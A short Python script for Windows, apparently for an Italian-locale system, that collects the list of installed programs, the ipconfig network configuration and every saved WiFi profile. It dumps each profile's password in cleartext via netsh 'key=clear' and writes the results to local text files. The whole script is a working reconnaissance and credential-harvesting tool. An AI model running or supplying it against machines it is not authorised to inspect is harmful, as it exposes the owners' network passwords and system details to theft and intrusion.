from subprocess import check_output, CalledProcessError
from time import sleep
from re import search

f = open('saved_profiles.txt', 'w')
f.close()

#Get installed programs
cmd = 'wmic product get name,version /format:table'
output = check_output(cmd, shell = True, universal_newlines = True)
sleep(10)
# Save the output to a file
with open('installed_programs.txt', 'w') as file:
    file.write(output)

#Get ipconfig informations    
cmd = 'ipconfig'
output = check_output(cmd, shell = True, universal_newlines = True)
# Save the output to a file
with open('ipconifg.txt', 'w') as file:
    file.write(output)
    
#Get saved WiFi profiles
command_output = check_output('netsh wlan show profiles', shell = True, universal_newlines = True).split('\n')
profile_names = [line.split(":")[1].strip() for line in command_output if "Tutti i profili utente" in line]
# Loop through profiles and retrieve passwords
for profile_name in profile_names:
    try:
        password_output = check_output(f'netsh wlan show profile name="{profile_name}" key=clear', shell = True, universal_newlines = True)
        password = search(r'Contenuto chiave.*:\s(.+)', password_output)
        if password:
            # Save the output to a file
            with open('saved_profiles.txt', 'a') as file:
                file.write(f'{profile_name} => {password.group(1)}\n')
        else:
            with open('saved_profiles.txt', 'a') as file:
                file.write(f'Password not found for {profile_name}\n')
    except CalledProcessError as e:
        with open('saved_profiles.txt', 'a') as file:
            file.write(f'Failed to retrieve password for {profile_name}\n')